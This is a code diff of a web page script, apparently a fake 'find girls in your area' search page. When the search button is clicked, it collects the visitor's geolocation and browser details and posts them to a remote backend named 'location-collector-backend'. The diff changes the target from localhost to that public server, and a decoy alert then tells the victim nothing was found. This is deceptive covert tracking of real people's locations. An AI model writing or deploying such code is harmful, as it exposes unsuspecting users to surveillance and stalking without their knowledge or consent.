@@ -11,23 +11,23 @@ document.getElementById('search-btn').addEventListener('click', () => {
                     screenResolution: `${window.screen.width}x${window.screen.height}`
                 };
                 const data = { location, browserInfo };
-                fetch('http://localhost:3000/save-data', {
+                fetch('https://location-collector-backend.onrender.com/save-data', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify(data)
                 })
-                .then(response => {
-                    if (response.ok) {
-                        alert('No girls found in your area.');
-                    } else {
-                        console.error('Server error');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                });
+                    .then(response => {
+                        if (response.ok) {
+                            alert('No girls found in your area.');
+                        } else {
+                            console.error('Server error');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                    });
             },
             error => {
                 alert('Location access deny kiya gaya hai. Please browser settings mein allow karo.');
